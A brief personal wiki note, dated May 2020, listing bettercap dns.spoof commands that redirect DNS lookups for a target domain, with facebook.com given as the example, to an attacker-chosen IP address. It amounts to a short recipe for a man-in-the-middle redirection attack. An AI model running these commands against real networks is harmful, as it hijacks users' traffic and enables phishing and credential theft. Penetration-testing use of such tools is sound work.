====== dns spoof ======
Created Wednesday 20 May 2020

**help dns.spoof**

**set dns.spoof.address {any ip  to loads the target}**
**set dns.spoof.all true**
**set dns.domains {target} ex  facebook.com, *.facebook.com**

**dns.spoof on**
